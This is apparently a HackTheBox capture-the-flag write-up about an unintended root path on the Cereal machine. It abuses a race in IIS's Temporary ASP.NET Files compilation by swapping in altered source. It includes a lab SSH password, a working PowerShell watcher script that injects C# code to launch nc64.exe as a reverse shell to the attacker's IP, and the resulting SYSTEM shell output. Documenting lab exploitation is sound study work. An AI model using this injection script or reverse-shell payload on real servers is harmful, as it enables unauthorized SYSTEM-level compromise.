---
title: Cereal Unintended Root
url: https://0xdf.gitlab.io/2021/05/31/htb-cereal-unintended.html
date: 2021-05-31T09:00:00+00:00
tags: ctf, hackthebox, htb-cereal, dotnet, iis, timing-attack
---

![cascade](https://0xdfimages.gitlab.io/img/cereal-unintended-cover.png)

There’s a really neat unintended path to root on Cereal discovered by HackTheBox user FF5. The important detail to notice is that a shell as sonny running via a webshell has additional groups related to IIS that don’t show up in an SSH shell. I can use these groups to exploit the IIS service and how it manages the website running as root with a timing attack that will allow me to slip my own code into the site and execute it. I’ll find the directory where IIS stages files and compiles them, the Shadow Copy Folders. I’ll delete everything in there, and trigger IIS to rebuilt. It will copy the source into the directory and compile it, but there’s a chance for me to modify the source between the copy and the compile.

## Enumeration

### Background

In the first part of the box, I’ll get a webshell running as sonny:

![image-20210528154949352](https://0xdfimages.gitlab.io/img/image-20210528154949352.png)

I’ll use the webshell to find creds for the sonny user that I can use for an SSH connection:

```

oxdf@parrot$ sshpass -p 'mutual.madden.manner38974' ssh sonny@10.10.10.217
Microsoft Windows [Version 10.0.17763.1817]                                             
(c) 2018 Microsoft Corporation. All rights reserved.
                                            
sonny@CEREAL C:\Users\sonny>

```

From there, I went on to use the SSH port forwarding to exploit an internal website listening on 8080 that was running as root.

### Groups

At this point, there’s a really unintuitive thing that’s worth noticing, and that’s the different between the webshell and the SSH:

![image-20210528155316554](https://0xdfimages.gitlab.io/img/image-20210528155316554.png)

Both are user sonny, but the webshell has additional groups, including IIS\_USERS, and source.cereal.htb. This is interesting. I think when IIS starts a webserver as a user, it gives that process token extra groups for web stuff.

### Temporary ASP.NET Files

Visiting `source.cereal.htb` returns a error page:

![img](https://0xdfimages.gitlab.io/img/6b27eebc86286c7d24ea5d331fba64a8.png)

The “Show Detailed Compiler Output” link shows a long command line:

![img](https://0xdfimages.gitlab.io/img/9257685eff95ffd30f1ef198a2095141.png)

The command that generates the error message is long:

```

c:\windows\system32\inetsrv> "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" 
/t:library /utf8output
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Web.Services\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Web.Services.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.CSharp\v4.0_4.0.0.0__b03f5f7f11d50a3a\Microsoft.CSharp.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.WorkflowServices\v4.0_4.0.0.0__31bf3856ad364e35\System.WorkflowServices.dll" /R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Xml.Linq\v4.0_4.0.0.0__b77a5c561934e089\System.Xml.Linq.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.ServiceModel.Web\v4.0_4.0.0.0__31bf3856ad364e35\System.ServiceModel.Web.dll"
/R:"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorlib.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_64\System.Data\v4.0_4.0.0.0__b77a5c561934e089\System.Data.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_64\System.Web\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Web.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Data.DataSetExtensions\v4.0_4.0.0.0__b77a5c561934e089\System.Data.DataSetExtensions.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.IdentityModel\v4.0_4.0.0.0__b77a5c561934e089\System.IdentityModel.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.ComponentModel.DataAnnotations\v4.0_4.0.0.0__31bf3856ad364e35\System.ComponentModel.DataAnnotations.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Core\v4.0_4.0.0.0__b77a5c561934e089\System.Core.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Web.DynamicData\v4.0_4.0.0.0__31bf3856ad364e35\System.Web.DynamicData.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Web.ApplicationServices\v4.0_4.0.0.0__31bf3856ad364e35\System.Web.ApplicationServices.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.ServiceModel.Activation\v4.0_4.0.0.0__31bf3856ad364e35\System.ServiceModel.Activation.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Drawing\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Drawing.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Configuration\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.ServiceModel.Activities\v4.0_4.0.0.0__31bf3856ad364e35\System.ServiceModel.Activities.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Web.Extensions\v4.0_4.0.0.0__31bf3856ad364e35\System.Web.Extensions.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Xml\v4.0_4.0.0.0__b77a5c561934e089\System.Xml.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Activities\v4.0_4.0.0.0__31bf3856ad364e35\System.Activities.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Runtime.Serialization\v4.0_4.0.0.0__b77a5c561934e089\System.Runtime.Serialization.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_64\System.EnterpriseServices\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.EnterpriseServices.dll"
/R:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.ServiceModel\v4.0_4.0.0.0__b77a5c561934e089\System.ServiceModel.dll"
/out:"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\c2032773\855af3a6\App_Web_mcfqyijo.dll"
/debug- /optimize+ /w:4 /nowarn:1659;1699;1701;612;618 /warnaserror-  
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\c2032773\855af3a6\App_Web_mcfqyijo.0.cs"
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\c2032773\855af3a6\App_Web_mcfqyijo.1.cs"

```

`csc.exe` is the C# compiler. The `/R` lines are including libraries. The output file (`/out`) is `App_Web_mcfqyijo.dll` in a path ending in `Temporary ASP.NET Files\root\c2032773\855af3a6\`. The files being compiled are `App_Web_mcfqyijo.0.cs` and `App_Web_mcfqyijo.1.cs` in that same directory.

#### Overview

There’s this directory, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\` that is used as “Shadow Copy Folders” ([link](https://stackoverflow.com/questions/450831/what-is-the-temporary-asp-net-files-folder-for)). Basically, IIS will use this path to copy the source files and compile them into binaries (`.dll` files) that are then executed.

One a fresh reset of Cereal, there’s three folders in `root`. This one represents the internal site:

```

PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157> ls

    Directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/11/2020  12:35 PM                assembly
d-----       11/11/2020  12:35 PM                hash
d-----       11/11/2020  12:35 PM                UserCache
-a----       11/11/2020  12:35 PM            456 preStartInitList.web
-a----       11/11/2020   1:03 PM          25308 profileoptimization.prof  

```

If I visit the site (from SSH or webshell run `iwr http://127.0.0.1:8080 -UseBasicParsing`), the first time it will hang for a minute, and then return. Now there are more files:

```

PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157> ls  

    Directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/11/2020  12:35 PM                assembly
d-----       11/11/2020  12:35 PM                hash
d-----       11/11/2020  12:35 PM                UserCache
-a----        5/28/2021   1:07 PM           9243 4tw3gfdy.cmdline
-a----        5/28/2021   1:07 PM              0 4tw3gfdy.err
-a----        5/28/2021   1:07 PM            364 4tw3gfdy.out
-a----        5/28/2021   1:07 PM              0 4tw3gfdy.tmp
-a----        5/28/2021   1:07 PM           2659 App_Web_4tw3gfdy.0.cs
-a----        5/28/2021   1:07 PM           1126 App_Web_4tw3gfdy.1.cs
-a----        5/28/2021   1:07 PM           6144 App_Web_4tw3gfdy.dll
-a----        5/28/2021   1:07 PM           7680 App_Web_4tw3gfdy.pdb
-a----        5/28/2021   1:07 PM           1725 App_Web_bxbun0qe.0.cs
-a----        5/28/2021   1:07 PM           1126 App_Web_bxbun0qe.1.cs
-a----        5/28/2021   1:07 PM           4608 App_Web_bxbun0qe.dll
-a----        5/28/2021   1:07 PM          11776 App_Web_bxbun0qe.pdb
-a----        5/28/2021   1:07 PM           1913 App_Web_ylps2g0x.0.cs
-a----        5/28/2021   1:07 PM           3473 App_Web_ylps2g0x.1.cs
-a----        5/28/2021   1:07 PM           1288 App_Web_ylps2g0x.2.cs
-a----        5/28/2021   1:07 PM           6656 App_Web_ylps2g0x.dll
-a----        5/28/2021   1:07 PM          11776 App_Web_ylps2g0x.pdb
-a----        5/28/2021   1:07 PM           9243 bxbun0qe.cmdline
-a----        5/28/2021   1:07 PM              0 bxbun0qe.err
-a----        5/28/2021   1:07 PM            364 bxbun0qe.out
-a----        5/28/2021   1:07 PM              0 bxbun0qe.tmp
-a----        5/28/2021   1:07 PM            344 error.cshtml.639c3968.compiled
-a----        5/28/2021   1:07 PM            335 index.cshtml.a8d08dba.compiled
-a----       11/11/2020  12:35 PM            456 preStartInitList.web
-a----       11/11/2020   1:03 PM          25308 profileoptimization.prof
-a----        5/28/2021   1:07 PM           9362 ylps2g0x.cmdline
-a----        5/28/2021   1:07 PM              0 ylps2g0x.err
-a----        5/28/2021   1:07 PM            364 ylps2g0x.out
-a----        5/28/2021   1:07 PM              0 ylps2g0x.tmp
-a----        5/28/2021   1:07 PM            354 _layout.cshtml.639c3968.compiled
-a----        5/28/2021   1:07 PM            342 _viewstart.cshtml.65a2d1ee.compiled 

```

The file `App_Web_4tw3gfdy.0.cs` has the C# code that handles the generation of the site HTML:

```

#pragma checksum "C:\inetpub\manager\Views\Home\Index.cshtml" "{8829d00f-11b8-4213-878b-770e8597ac16}" "FBA5ABCAB236799B387455CB0C74EB0AD055D5A5356CD08E3CC3882EF902F6D7"
...[snip]... 
    public class _Page_Views_Home_Index_cshtml : System.Web.Mvc.WebViewPage<dynamic> {

#line hidden
                                         
        public _Page_Views_Home_Index_cshtml() {
        }
                                                                                                                                                                                        protected ASP.global_asax ApplicationInstance {
            get {
                return ((ASP.global_asax)(Context.ApplicationInstance));
            }
        }
        
        public override void Execute() {
WriteLiteral("<div");
WriteLiteral(" class=\"jumbotron\"");
WriteLiteral(">\r\n    <h1>Manufacturing Plant Status</h1>\r\n</div>\r\n\r\n<table");
WriteLiteral(" class=\"table\"");
WriteLiteral(">\r\n    <thead>\r\n        <tr>\r\n            <th");
WriteLiteral(" scope=\"col\"");
WriteLiteral(">#</th>\r\n            <th");
WriteLiteral(" scope=\"col\"");
WriteLiteral(">Location</th>\r\n            <th");
WriteLiteral(" scope=\"col\"");
WriteLiteral(">Status</th>\r\n        </tr>\r\n    </thead>\r\n    <tbody");
WriteLiteral(" id=\"opstatus\"");
WriteLiteral(@">
        <tr>
        </tr>
    </tbody>
</table>

<script>
    fetch('/api/graphql', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        },
        body: JSON.stringify({ query: ""{ allPlants { id, location, status } }"" })
    }).then(r => r.json()).then(r => r.data.allPlants.forEach(d => document.getElementById('opstatus').innerHTML += `<tr><th scope=""row"">${d.id}</th><td>${d.location}</td><td>${d.status}</td></tr>`))
</script>");
        }
    }
}

```

It doesn’t translate to a post very well, but if I `type App_Web_4tw3gfdy.dll`, it has all the same strings, and is the compiled result of this code.

#### Deleting

Through the webshell, I have permissions to delete everything in this directory. If I run `del *`, and then wait for it to finish, it will be completely empty (sometimes I got errors, but just running `del *` again will work).

Then, if I hit the page again, all the stuff rebuilds and comes back (with some slightly different random names):

```

PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157> ls

    Directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/28/2021   1:14 PM                assembly
d-----        5/28/2021   1:14 PM                hash
d-----        5/28/2021   1:14 PM                UserCache
-a----        5/28/2021   1:15 PM           9362 22wrji2k.cmdline
-a----        5/28/2021   1:15 PM              0 22wrji2k.err
-a----        5/28/2021   1:15 PM            364 22wrji2k.out
-a----        5/28/2021   1:15 PM              0 22wrji2k.tmp
-a----        5/28/2021   1:15 PM           1913 App_Web_22wrji2k.0.cs
-a----        5/28/2021   1:15 PM           3473 App_Web_22wrji2k.1.cs
-a----        5/28/2021   1:15 PM           1288 App_Web_22wrji2k.2.cs
-a----        5/28/2021   1:15 PM           6656 App_Web_22wrji2k.dll
-a----        5/28/2021   1:15 PM          11776 App_Web_22wrji2k.pdb
-a----        5/28/2021   1:15 PM           1725 App_Web_vircjsmd.0.cs
-a----        5/28/2021   1:15 PM           1126 App_Web_vircjsmd.1.cs
-a----        5/28/2021   1:15 PM           4608 App_Web_vircjsmd.dll
-a----        5/28/2021   1:15 PM          11776 App_Web_vircjsmd.pdb
-a----        5/28/2021   1:14 PM           2659 App_Web_zgj5iqtm.0.cs
-a----        5/28/2021   1:14 PM           1126 App_Web_zgj5iqtm.1.cs
-a----        5/28/2021   1:15 PM           6144 App_Web_zgj5iqtm.dll
-a----        5/28/2021   1:15 PM           7680 App_Web_zgj5iqtm.pdb
-a----        5/28/2021   1:15 PM            344 error.cshtml.639c3968.compiled
-a----        5/28/2021   1:15 PM            335 index.cshtml.a8d08dba.compiled
-a----        5/28/2021   1:14 PM            456 preStartInitList.web
-a----        5/28/2021   1:15 PM           9243 vircjsmd.cmdline
-a----        5/28/2021   1:15 PM              0 vircjsmd.err
-a----        5/28/2021   1:15 PM            364 vircjsmd.out
-a----        5/28/2021   1:15 PM              0 vircjsmd.tmp
-a----        5/28/2021   1:14 PM           9243 zgj5iqtm.cmdline
-a----        5/28/2021   1:14 PM              0 zgj5iqtm.err
-a----        5/28/2021   1:15 PM            364 zgj5iqtm.out
-a----        5/28/2021   1:14 PM              0 zgj5iqtm.tmp
-a----        5/28/2021   1:15 PM            354 _layout.cshtml.639c3968.compiled
-a----        5/28/2021   1:15 PM            342 _viewstart.cshtml.65a2d1ee.compiled

```

## Timing Attack

### Strategy

There’s a timing attack here that ff5 found that’s really clever. I’ll delete the full directory for the site running as SYSTEM. The next time someone tries to access the site, IIS will stage the source code files into this directory and compile them. I’ll use a PowerShell script to watch for a file with a name matching `App_Web_*.0.cs`, and when that file exists, change it, adding in some additional code that run a binary. ff5’s script triggered `C:\programdata\q.exe`, but I’ll use `nc`. As long as those changes are made before the compilation uses the file, the binary will have the call of the exe in there, and that exe will be run on each request to the site.

### Script

The script I’m going to use (written by ff5 with modified payload) is:

```

$folder = 'C:\windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157'
$filter = 'App_Web_*.*.cs'
 
$fsw = New-Object IO.FileSystemWatcher $folder, $filter -Property @{IncludeSubdirectories = $false;NotifyFilter = [IO.NotifyFilters]'FileName, LastWrite, LastAccess'} 
 
$global:trig = 0
$global:pwn = @"
Execute() {
    System.Diagnostics.Process process = new System.Diagnostics.Process();
    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
    startInfo.FileName = "c:\\programdata\\nc64.exe";
    startInfo.Arguments = "10.10.14.15 443 -e powershell";
    process.StartInfo = startInfo;
    process.Start();

"@
 
Register-ObjectEvent $fsw Changed -SourceIdentifier FileChanged -Action { 
    $name = $Event.SourceEventArgs.Name 
    $changeType = $Event.SourceEventArgs.ChangeType 
    $timeStamp = $Event.TimeGenerated 
    Write-Host "The file '$name' was $changeType at $timeStamp" -fore white 
    if($name -like 'App_Web_*.0.cs' -AND $global:trig -eq 0) {
        Write-Host "Current trig: $global:trig by '$name'"
        $global:trig = 1;
        $src = get-content $name;
        $src = $src -replace 'Execute\(\) {$', $global:pwn
        $src = $src -replace 'using System;$', 'using System; using System.Diagnostics;'
        echo $src > $name
    }
} 

```

It uses a `FileSystemWatcher` [object](https://powershell.one/tricks/filesystem/filesystemwatcher) to register a file change event handler looking for C# source files in the Shadow File Copy directory. It finds `Execute() {` and replaces it with `Execute() {` and then the malicious code. It also does a similar find and replace to bring in an additional import. It does uses a global variable (`$global:trig`) to make sure to only change the first one it finds. Not adding this will cause the changes to take place again and again, and eventually break the compilation.

### Exploit

I’ll start with both an SSH shell and a webshell, and use the webshell and `nc64.exe` to get a shell that way (which I’ll just refer to as the webshell shell). From the webshell shell, I’ll delete all the shadow copy folders:

```

PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157> del *
del *

```

This can hang, and sometimes it completed without deleting everything (I just ran it again until it finished).

Next I’ll upload the `watcher.ps1` file to that directory:

```

PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157> iwr http://10.10.14.15/watcher.ps1 -outfile watcher.ps1

PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157> ls

    Directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/30/2021  12:43 PM           1421 watcher.ps1

```

Now I’ll run it:

```

PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\cfb457c9\c7fa5157> .\watcher.ps1
.\watcher.ps1

Id     Name            PSJobTypeName   State         HasMoreData     Location             Command                  
--     ----            -------------   -----         -----------     --------             -------                  
1      FileChanged                     NotStarted    False                                 ...   

```

It says `NotStarted`, but that’s ok.

From the SSH shell, I’ll request the site. It takes a minute, but it comes back:

```

PS C:\inetpub\source\uploads> iwr http://127.0.0.1:8080 -UseBasicParsing
StatusCode        : 200
StatusDescription : OK 
...[snip]...

```

While it’s waiting, status lines start printing on the webshell shell:

```

The file 'App_Web_3u0g0msp.0.cs' was Changed at 05/30/2021 12:45:21
Current trig: 0 by 'App_Web_3u0g0msp.0.cs'
The file 'App_Web_3u0g0msp.1.cs' was Changed at 05/30/2021 12:45:21
The file 'App_Web_3u0g0msp.0.cs' was Changed at 05/30/2021 12:45:22
The file 'App_Web_3u0g0msp.0.cs' was Changed at 05/30/2021 12:45:22
The file 'App_Web_u0qkgrng.0.cs' was Changed at 05/30/2021 12:45:36
The file 'App_Web_u0qkgrng.1.cs' was Changed at 05/30/2021 12:45:36
The file 'App_Web_y2w2ry3y.0.cs' was Changed at 05/30/2021 12:45:37
The file 'App_Web_y2w2ry3y.1.cs' was Changed at 05/30/2021 12:45:37
The file 'App_Web_y2w2ry3y.2.cs' was Changed at 05/30/2021 12:45:37

```

When it completes, there’s a callback at my `nc`:

```

oxdf@parrot$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.217] 49791
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> whoami
nt authority\system

```

[« HTB: Cereal](/2021/05/29/htb-cereal.html)